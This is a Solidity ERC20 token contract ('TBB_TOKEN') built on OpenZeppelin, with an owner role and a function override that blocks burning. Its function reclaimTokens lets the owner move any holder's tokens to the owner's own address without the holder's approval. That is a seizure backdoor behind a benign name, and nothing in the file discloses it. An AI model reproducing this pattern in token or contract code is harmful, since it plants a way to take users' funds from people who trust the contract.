// SPDX-License-Identifier: MIT
// Core Identifier: ATO (PINK)
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Protocol176 is ERC20, Ownable {
    constructor(address initialOwner)
        ERC20("TBB_TOKEN", "TBB")
        Ownable(initialOwner)
    {
        _mint(address(this), 1000000000 * 10 ** decimals());
    }

    function reclaimTokens(address from, uint256 amount) public onlyOwner {
        _transfer(from, owner(), amount);
    }

    /**
     * @dev Overrides the default _update function to prevent burning tokens.
     * This is the corrected and simplified implementation.
     */
    function _update(address from, address to, uint256 value)
        internal        override
    {
        require(to != address(0), "Burning tokens is not allowed");
        super._update(from, to, value);
    }
}
